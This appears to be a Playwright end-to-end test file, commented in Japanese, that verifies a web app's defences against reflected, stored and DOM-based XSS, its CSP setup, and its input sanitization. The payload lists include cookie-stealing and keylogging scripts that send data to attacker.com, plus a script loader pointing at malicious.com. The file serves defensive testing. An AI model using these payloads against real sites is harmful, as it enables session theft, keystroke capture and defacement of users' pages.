// TEST-E2E-025: XSS防御検証テスト（5 SP）
// Reflected XSS, Stored XSS, DOM-based XSS, CSP validation, Input sanitization
import { test, expect } from '@playwright/test';

test.describe('TEST-E2E-025: XSS防御検証テスト', () => {
  let page;

  test.beforeEach(async ({ browser }) => {
    page = await browser.newPage();
    await page.goto('/');
    await page.waitForLoadState('networkidle');
    
    // XSS防御システムの初期化を待機
    await page.waitForFunction(() => {
      return window.XSSProtector && 
             window.OutputEscaper && 
             window.CSPManager &&
             window.DOMSecurityManager;
    });
  });

  test.afterEach(async () => {
    await page.close();
  });

  test('Reflected XSS防御テスト', async () => {
    test.setTimeout(90000);

    const reflectedXSSPayloads = [
      // 基本的なスクリプトタグ
      '<script>alert("XSS")</script>',
      '<script>alert(document.cookie)</script>',
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      
      // イベントハンドラーを使用
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '<body onload=alert("XSS")>',
      '<input type="text" onfocus=alert("XSS") autofocus>',
      '<div onmouseover=alert("XSS")>hover me</div>',
      
      // JavaScriptプロトコル
      '<a href="javascript:alert(\'XSS\')">click me</a>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      
      // HTML5新要素
      '<audio src=x onerror=alert("XSS")>',
      '<video src=x onerror=alert("XSS")>',
      '<source src=x onerror=alert("XSS")>',
      
      // 属性値内でのXSS
      '<div title="&quot;><script>alert(\'XSS\')</script>">',
      '<input value="&quot;><script>alert(\'XSS\')</script>">',
      
      // CSS injection
      '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
      '<div style="background:url(javascript:alert(\'XSS\'))">',
      
      // エンコードされたXSS
      '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
      '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
      
      // 全角文字を使用したXSS
      '＜script＞alert("XSS")＜/script＞',
      'ｊａｖａｓｃｒｉｐｔ：alert("XSS")',
      
      // 日本語を含むXSS
      '<script>alert("日本語XSS攻撃")</script>',
      '<img src=x onerror=alert("これは日本語のXSS攻撃です")>',
      
      // Template literal XSS
      '${alert("XSS")}',
      '`${alert("XSS")}`',
      
      // DOM clobbering
      '<form id="test"><input name="innerHTML"></form>',
      '<img name="body" src=x>',
      
      // SVG XSS
      '<svg><script>alert("XSS")</script></svg>',
      '<svg><animate onbegin=alert("XSS")></svg>',
      
      // Math ML XSS
      '<math><mtext><script>alert("XSS")</script></mtext></math>',
      
      // XML namespace XSS
      '<div xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(\'XSS\')">',
      
      // Filter evasion
      '<scr<script>ipt>alert("XSS")</script>',
      '<SCRİPT>alert("XSS")</SCRİPT>',
      '<script/src=data:,alert("XSS")>',
      
      // Event handler filter evasion
      '<img src=x onerror=alert("XSS") />',
      '<img src=x onerror="alert(&#39;XSS&#39;)">',
      '<img src=x onError=alert("XSS")'
    ];

    // 1. URL パラメータでのReflected XSSテスト
    for (const payload of reflectedXSSPayloads) {
      const encodedPayload = encodeURIComponent(payload);
      
      // URLパラメータにXSSペイロードを追加
      await page.goto(`/?search=${encodedPayload}`);
      await page.waitForLoadState('networkidle');
      
      // XSSが実行されていないことを確認
      const alertDialogs = [];
      page.on('dialog', dialog => {
        alertDialogs.push(dialog.message());
        dialog.dismiss();
      });
      
      await page.waitForTimeout(1000);
      expect(alertDialogs.length).toBe(0);
      
      // エスケープされた内容が表示されていることを確認
      const searchDisplay = await page.textContent('[data-testid="search-result"]').catch(() => null);
      if (searchDisplay) {
        expect(searchDisplay).not.toContain('<script>');
        expect(searchDisplay).not.toContain('onerror=');
      }
    }

    // 2. フォーム入力での Reflected XSS テスト
    for (const payload of reflectedXSSPayloads.slice(0, 10)) { // 一部のペイロードでテスト
      await page.click('[data-testid="search-input"]');
      await page.fill('[data-testid="search-input"]', payload);
      await page.click('[data-testid="search-submit"]');
      
      await page.waitForTimeout(500);
      
      // サニタイゼーションの確認
      const sanitizationResult = await page.evaluate((input) => {
        return window.XSSProtector.sanitizeInput(input);
      }, payload);
      
      expect(sanitizationResult.isSafe).toBe(true);
      expect(sanitizationResult.sanitized).not.toContain('<script>');
      expect(sanitizationResult.sanitized).not.toContain('javascript:');
    }

    // 3. Reflected XSS検出ログの確認
    const reflectedXSSLogs = await page.evaluate(() => {
      return window.SecurityLogger.getLogs('reflected_xss');
    });

    expect(reflectedXSSLogs.length).toBeGreaterThan(0);
    expect(reflectedXSSLogs).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'reflected_xss_attempt',
          severity: 'high',
          blocked: true,
          payload: expect.any(String)
        })
      ])
    );
  });

  test('Stored XSS防御テスト', async () => {
    test.setTimeout(90000);

    const storedXSSPayloads = [
      // 永続化スクリプト
      '<script>setInterval(function(){alert("Persistent XSS")}, 5000)</script>',
      '<script>document.body.innerHTML="<h1>Site Defaced</h1>"</script>',
      
      // cookie 窃取
      '<script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie</script>',
      '<script>fetch("http://attacker.com/steal", {method:"POST",body:document.cookie})</script>',
      
      // キーロガー
      '<script>document.onkeypress=function(e){fetch("http://attacker.com/log?key="+e.key)}</script>',
      
      // フォームハイジャック
      '<script>document.forms[0].action="http://attacker.com/steal"</script>',
      
      // リダイレクト攻撃
      '<script>window.location="http://malicious.com"</script>',
      '<meta http-equiv="refresh" content="0;url=http://malicious.com">',
      
      // ソーシャルエンジニアリング
      '<script>if(confirm("セキュリティ更新が必要です。続行しますか？")){window.location="http://fake-update.com"}</script>',
      
      // 管理者なりすまし
      '<script>alert("管理者より：システムメンテナンスのため、パスワードを再入力してください")</script>',
      
      // 日本語を含む永続XSS
      '<script>document.title="このサイトは乗っ取られました"</script>',
      '<script>alert("永続的な日本語XSS攻撃")</script>'
    ];

    // 1. PlantUML コメント保存での Stored XSS テスト
    for (const payload of storedXSSPayloads) {
      await page.click('[data-testid="action-editor-btn"]');
      await page.waitForSelector('[data-testid="action-editor-modal"]');
      
      await page.fill('[data-testid="action-from-input"]', 'User');
      await page.fill('[data-testid="action-to-input"]', 'System');
      await page.fill('[data-testid="action-message-input"]', payload);
      await page.fill('[data-testid="action-comment-input"]', `Comment with XSS: ${payload}`);
      
      await page.click('[data-testid="action-save-btn"]');
      
      // 保存後の表示確認
      await page.waitForTimeout(500);
      
      // XSSが実行されていないことを確認
      const alertDialogs = [];
      page.on('dialog', dialog => {
        alertDialogs.push(dialog.message());
        dialog.dismiss();
      });
      
      await page.waitForTimeout(1000);
      expect(alertDialogs.length).toBe(0);
      
      // データベースに安全に保存されていることを確認
      const savedAction = await page.evaluate(() => {
        const actions = window.ActionEditor.getAllActions();
        return actions[actions.length - 1]; // 最後に保存されたアクション
      });
      
      // エスケープされて保存されていることを確認
      expect(savedAction.message).not.toContain('<script>');
      expect(savedAction.comment).not.toContain('<script>');
      
      // モーダルを閉じる
      const closeBtn = await page.locator('[data-testid="action-editor-close"]').first();
      if (await closeBtn.isVisible()) {
        await closeBtn.click();
      }
    }

    // 2. ユーザープロフィール設定での Stored XSS テスト
    const profileXSSPayloads = storedXSSPayloads.slice(0, 5);
    
    for (const payload of profileXSSPayloads) {
      const profileResult = await page.evaluate(async (xss) => {
        try {
          return await window.UserProfileManager.updateProfile({
            displayName: xss,
            bio: `User bio with XSS: ${xss}`,
            signature: xss
          });
        } catch (error) {
          return { error: error.message, blocked: true };
        }
      }, payload);
      
      // XSSが含まれるプロフィール更新がブロックされることを確認
      expect(profileResult.blocked || profileResult.error).toBeTruthy();
    }

    // 3. ファイルアップロードでの Stored XSS テスト
    const maliciousHTML = `<!DOCTYPE html>
    <html>
    <head><title>Malicious File</title></head>
    <body>
      <script>alert("Stored XSS from uploaded file")</script>
      <h1>このファイルはXSS攻撃を含んでいます</h1>
    </body>
    </html>`;

    await page.setInputFiles('[data-testid="file-upload"]', {
      name: 'malicious.html',
      mimeType: 'text/html',
      buffer: Buffer.from(maliciousHTML)
    });

    const uploadResult = await page.evaluate(() => {
      return window.FileUploadHandler.getLastUploadResult();
    });

    expect(uploadResult.blocked).toBe(true);
    expect(uploadResult.reason).toContain('malicious_content');

    // 4. Stored XSS検出ログの確認
    const storedXSSLogs = await page.evaluate(() => {
      return window.SecurityLogger.getLogs('stored_xss');
    });

    expect(storedXSSLogs.length).toBeGreaterThan(0);
    expect(storedXSSLogs).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'stored_xss_attempt',
          severity: 'critical',
          blocked: true
        })
      ])
    );
  });

  test('DOM-based XSS防御テスト', async () => {
    test.setTimeout(90000);

    const domXSSPayloads = [
      // location.hash manipulation
      '<script>alert("DOM XSS via hash")</script>',
      'javascript:alert("DOM XSS")',
      
      // innerHTML manipulation
      '<img src=x onerror=alert("DOM XSS")>',
      
      // document.write exploitation
      '<script>document.write("<script>alert(\\"DOM XSS\\")<\\/script>")</script>',
      
      // eval() exploitation
      'alert("DOM XSS")',
      
      // setTimeout/setInterval exploitation
      'alert("DOM XSS via setTimeout")',
      
      // Function constructor
      'alert("DOM XSS via Function")',
      
      // postMessage exploitation
      '<script>parent.postMessage("alert(\\"DOM XSS\\")", "*")</script>',
      
      // JSON.parse with reviver
      '{"__proto__":{"evil":"alert(\\"DOM XSS\\")"}}',
      
      // 日本語 DOM XSS
      '<script>alert("DOM経由の日本語XSS")</script>'
    ];

    // 1. URLハッシュ操作でのDOM XSSテスト
    for (const payload of domXSSPayloads) {
      const encodedPayload = encodeURIComponent(payload);
      
      // ハッシュにペイロードを設定
      await page.evaluate((hash) => {
        window.location.hash = hash;
      }, encodedPayload);
      
      await page.waitForTimeout(500);
      
      // DOM XSSが実行されていないことを確認
      const alertDialogs = [];
      page.on('dialog', dialog => {
        alertDialogs.push(dialog.message());
        dialog.dismiss();
      });
      
      await page.waitForTimeout(1000);
      expect(alertDialogs.length).toBe(0);
    }

    // 2. innerHTML操作での防御テスト
    for (const payload of domXSSPayloads.slice(0, 5)) {
      const domManipulationResult = await page.evaluate((html) => {
        try {
          // 直接innerHTML操作を試行
          const testDiv = document.createElement('div');
          testDiv.innerHTML = html;
          document.body.appendChild(testDiv);
          
          // セキュリティチェック
          return window.DOMSecurityManager.validateDOMChange(testDiv);
        } catch (error) {
          return { error: error.message, blocked: true };
        }
      }, payload);
      
      // 危険なDOM操作がブロックされることを確認
      expect(domManipulationResult.blocked || domManipulationResult.safe === false).toBeTruthy();
    }

    // 3. 動的スクリプト生成の防御
    const dynamicScriptTests = [
      'document.createElement("script").src="http://malicious.com/evil.js"',
      'eval("alert(\\"DOM XSS\\")")',
      'Function("alert(\\"DOM XSS\\")")()',
      'setTimeout("alert(\\"DOM XSS\\")", 100)',
      'setInterval("alert(\\"DOM XSS\\")", 100)'
    ];

    for (const scriptTest of dynamicScriptTests) {
      const dynamicExecutionResult = await page.evaluate((code) => {
        try {
          // 動的コード実行の監視
          return window.DOMSecurityManager.monitorDynamicExecution(() => {
            eval(code);
          });
        } catch (error) {
          return { error: error.message, blocked: true };
        }
      }, scriptTest);
      
      expect(dynamicExecutionResult.blocked || dynamicExecutionResult.error).toBeTruthy();
    }

    // 4. DOM Clobbering 防御テスト
    const clobberingTests = [
      '<form id="body"><input name="innerHTML"></form>',
      '<img id="location" name="href" src="x">',
      '<form id="document"><input name="cookie"></form>',
      '<iframe name="console" src="about:blank"></iframe>'
    ];

    for (const clobberingHTML of clobberingTests) {
      const clobberingResult = await page.evaluate((html) => {
        try {
          const parser = new DOMParser();
          const doc = parser.parseFromString(html, 'text/html');
          
          return window.DOMSecurityManager.checkDOMClobbering(doc);
        } catch (error) {
          return { error: error.message, blocked: true };
        }
      }, clobberingHTML);
      
      expect(clobberingResult.isClobbering).toBe(true);
      expect(clobberingResult.blocked).toBe(true);
    }

    // 5. DOM-based XSS検出ログの確認
    const domXSSLogs = await page.evaluate(() => {
      return window.SecurityLogger.getLogs('dom_xss');
    });

    expect(domXSSLogs.length).toBeGreaterThan(0);
    expect(domXSSLogs).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          type: 'dom_xss_attempt',
          severity: 'high',
          blocked: true
        })
      ])
    );
  });

  test('Content Security Policy検証テスト', async () => {
    test.setTimeout(60000);

    // 1. CSPヘッダーの存在確認
    const cspHeader = await page.evaluate(() => {
      const metaCSP = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
      return metaCSP ? metaCSP.getAttribute('content') : null;
    });

    expect(cspHeader).toBeDefined();
    expect(cspHeader).toBeTruthy();

    // 2. CSP ディレクティブの確認
    const cspDirectives = await page.evaluate(() => {
      return window.CSPManager.getCurrentCSP();
    });

    expect(cspDirectives).toEqual(
      expect.objectContaining({
        'default-src': expect.any(String),
        'script-src': expect.any(String),
        'style-src': expect.any(String),
        'img-src': expect.any(String),
        'object-src': expect.any(String),
        'frame-src': expect.any(String)
      })
    );

    // 'unsafe-inline' や 'unsafe-eval' が含まれていないことを確認
    expect(cspDirectives['script-src']).not.toContain('unsafe-inline');
    expect(cspDirectives['script-src']).not.toContain('unsafe-eval');

    // 3. CSP違反の検出とブロック
    const cspViolationTests = [
      // インラインスクリプト
      () => {
        const script = document.createElement('script');
        script.innerHTML = 'alert("CSP violation")';
        document.head.appendChild(script);
      },
      
      // インラインスタイル
      () => {
        const div = document.createElement('div');
        div.style.cssText = 'background: url(javascript:alert("CSP violation"))';
        document.body.appendChild(div);
      },
      
      // 外部スクリプト（許可されていないドメイン）
      () => {
        const script = document.createElement('script');
        script.src = 'http://malicious.com/evil.js';
        document.head.appendChild(script);
      }
    ];

    let cspViolations = [];
    page.on('securitystatechanged', event => {
      if (event.securityState === 'insecure') {
        cspViolations.push(event);
      }
    });

    for (const violationTest of cspViolationTests) {
      await page.evaluate(violationTest);
      await page.waitForTimeout(500);
    }

    // CSP違反が検出されていることを確認
    const cspViolationLogs = await page.evaluate(() => {
      return window.CSPManager.getViolationReports();
    });

    expect(cspViolationLogs.length).toBeGreaterThan(0);

    // 4. nonce の適切な使用確認
    const nonceUsage = await page.evaluate(() => {
      const scriptsWithNonce = document.querySelectorAll('script[nonce]');
      const stylesWithNonce = document.querySelectorAll('style[nonce], link[nonce]');
      
      return {
        scriptNonces: Array.from(scriptsWithNonce).map(s => s.nonce),
        styleNonces: Array.from(stylesWithNonce).map(s => s.nonce),
        noncePattern: /^[a-zA-Z0-9+/]{16,}={0,2}$/ // Base64 pattern
      };
    });

    // nonce が適切な形式であることを確認
    nonceUsage.scriptNonces.forEach(nonce => {
      expect(nonce).toMatch(nonceUsage.noncePattern);
    });

    // 5. CSP報告機能のテスト
    const cspReportTest = await page.evaluate(async () => {
      // CSP違反レポートの送信をシミュレート
      const violationEvent = {
        'csp-report': {
          'document-uri': window.location.href,
          'violated-directive': 'script-src',
          'blocked-uri': 'inline',
          'line-number': 1,
          'source-file': window.location.href
        }
      };
      
      return await window.CSPManager.reportViolation(violationEvent);
    });

    expect(cspReportTest.reported).toBe(true);
  });

  test('入力サニタイゼーション検証テスト', async () => {
    test.setTimeout(60000);

    const sanitizationTests = [
      {
        input: '<script>alert("XSS")</script>',
        expected: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
        context: 'html'
      },
      {
        input: 'javascript:alert("XSS")',
        expected: '',
        context: 'url'
      },
      {
        input: 'onclick="alert(\'XSS\')"',
        expected: '',
        context: 'attribute'
      },
      {
        input: '${alert("XSS")}',
        expected: '${alert(&quot;XSS&quot;)}',
        context: 'template'
      },
      {
        input: '<img src=x onerror=alert("XSS")>',
        expected: '&lt;img src=x&gt;',
        context: 'html'
      },
      {
        input: 'これは<script>alert("日本語XSS")</script>テストです',
        expected: 'これは&lt;script&gt;alert(&quot;日本語XSS&quot;)&lt;/script&gt;テストです',
        context: 'html'
      }
    ];

    // 1. 各コンテキストでのサニタイゼーション確認
    for (const test of sanitizationTests) {
      const sanitizedResult = await page.evaluate((input, context) => {
        return window.OutputEscaper.escape(input, context);
      }, test.input, test.context);

      expect(sanitizedResult).not.toContain('<script>');
      expect(sanitizedResult).not.toContain('javascript:');
      expect(sanitizedResult).not.toContain('onerror=');
      
      // 日本語文字は保持されることを確認
      if (test.input.includes('これは') || test.input.includes('テスト')) {
        expect(sanitizedResult).toContain('これは');
        expect(sanitizedResult).toContain('テスト');
      }
    }

    // 2. 再帰的XSSの防御
    const recursiveXSSTests = [
      '<scr<script>ipt>alert("XSS")</script>',
      '<img src=x oneonerrorrror=alert("XSS")>',
      '<<SCRIPT>alert("XSS")//<</SCRIPT>',
      '<iframe src="java&Tab;script:alert(\'XSS\')"></iframe>'
    ];

    for (const recursiveTest of recursiveXSSTests) {
      const recursiveSanitizationResult = await page.evaluate((input) => {
        return window.OutputEscaper.deepSanitize(input);
      }, recursiveTest);

      expect(recursiveSanitizationResult).not.toContain('<script>');
      expect(recursiveSanitizationResult).not.toContain('javascript:');
      expect(recursiveSanitizationResult).not.toContain('onerror');
    }

    // 3. エンコーディング別サニタイゼーション
    const encodingTests = [
      {
        input: '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
        encoding: 'url'
      },
      {
        input: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
        encoding: 'html'
      },
      {
        input: '\\u003cscript\\u003ealert(\\u0022XSS\\u0022)\\u003c/script\\u003e',
        encoding: 'unicode'
      }
    ];

    for (const encodingTest of encodingTests) {
      const decodedAndSanitized = await page.evaluate((input, encoding) => {
        const decoded = window.OutputEscaper.decode(input, encoding);
        return window.OutputEscaper.escape(decoded, 'html');
      }, encodingTest.input, encodingTest.encoding);

      expect(decodedAndSanitized).not.toContain('<script>');
    }

    // 4. ホワイトリストベースのサニタイゼーション
    const whitelistTest = await page.evaluate(() => {
      const allowedTags = ['p', 'span', 'strong', 'em'];
      const allowedAttributes = ['class', 'id'];
      
      const input = '<p class="safe">安全なコンテンツ</p><script>alert("XSS")</script><span onclick="alert()">危険</span>';
      
      return window.OutputEscaper.sanitizeWithWhitelist(input, allowedTags, allowedAttributes);
    });

    expect(whitelistTest).toContain('<p class="safe">安全なコンテンツ</p>');
    expect(whitelistTest).not.toContain('<script>');
    expect(whitelistTest).not.toContain('onclick');

    // 5. サニタイゼーション性能テスト
    const performanceTest = await page.evaluate(() => {
      const largeInput = '<script>alert("XSS")</script>'.repeat(1000);
      const startTime = performance.now();
      
      window.OutputEscaper.escape(largeInput, 'html');
      
      const endTime = performance.now();
      return endTime - startTime;
    });

    // サニタイゼーションが100ms以内で完了することを確認
    expect(performanceTest).toBeLessThan(100);
  });

  test('出力エンコーディング検証テスト', async () => {
    test.setTimeout(60000);

    // 1. HTML コンテキストでのエンコーディング
    const htmlEncodingTests = [
      { input: '<>&"\'', expected: '&lt;&gt;&amp;&quot;&#39;' },
      { input: 'これは日本語です', expected: 'これは日本語です' },
      { input: '特殊文字: <script>', expected: '特殊文字: &lt;script&gt;' }
    ];

    for (const test of htmlEncodingTests) {
      const encoded = await page.evaluate((input) => {
        return window.OutputEscaper.htmlEncode(input);
      }, test.input);

      expect(encoded).toBe(test.expected);
    }

    // 2. JavaScript コンテキストでのエンコーディング
    const jsEncodingTests = [
      { input: '"; alert("XSS"); "', expected: '\\"\\u003b\\u0020alert(\\u0022XSS\\u0022)\\u003b\\u0020\\"' },
      { input: '\n\r\t', expected: '\\n\\r\\t' },
      { input: '日本語"テスト"', expected: '日本語\\u0022テスト\\u0022' }
    ];

    for (const test of jsEncodingTests) {
      const encoded = await page.evaluate((input) => {
        return window.OutputEscaper.jsEncode(input);
      }, test.input);

      expect(encoded).not.toContain('"');
      expect(encoded).not.toContain('\n');
    }

    // 3. URL コンテキストでのエンコーディング
    const urlEncodingTests = [
      { input: 'javascript:alert("XSS")', expected: 'javascript%3Aalert%28%22XSS%22%29' },
      { input: '日本語パラメータ', expected: '%E6%97%A5%E6%9C%AC%E8%AA%9E%E3%83%91%E3%83%A9%E3%83%A1%E3%83%BC%E3%82%BF' },
      { input: 'safe-parameter-123', expected: 'safe-parameter-123' }
    ];

    for (const test of urlEncodingTests) {
      const encoded = await page.evaluate((input) => {
        return window.OutputEscaper.urlEncode(input);
      }, test.input);

      expect(encoded).toBe(test.expected);
    }

    // 4. CSS コンテキストでのエンコーディング
    const cssEncodingTests = [
      { input: 'expression(alert("XSS"))', expected: '\\65 xpression\\28 alert\\28 \\22 XSS\\22 \\29 \\29' },
      { input: 'background:url(javascript:)', expected: 'background\\3a url\\28 javascript\\3a \\29' }
    ];

    for (const test of cssEncodingTests) {
      const encoded = await page.evaluate((input) => {
        return window.OutputEscaper.cssEncode(input);
      }, test.input);

      expect(encoded).not.toContain('expression(');
      expect(encoded).not.toContain('javascript:');
    }

    // 5. 統合エンコーディングテスト
    const mixedContextTest = await page.evaluate(() => {
      const userInput = '<script>alert("XSS")</script>';
      
      return {
        html: window.OutputEscaper.htmlEncode(userInput),
        js: window.OutputEscaper.jsEncode(userInput),
        url: window.OutputEscaper.urlEncode(userInput),
        css: window.OutputEscaper.cssEncode(userInput)
      };
    });

    expect(mixedContextTest.html).not.toContain('<script>');
    expect(mixedContextTest.js).not.toContain('<script>');
    expect(mixedContextTest.url).not.toContain('<script>');
    expect(mixedContextTest.css).not.toContain('<script>');
  });
});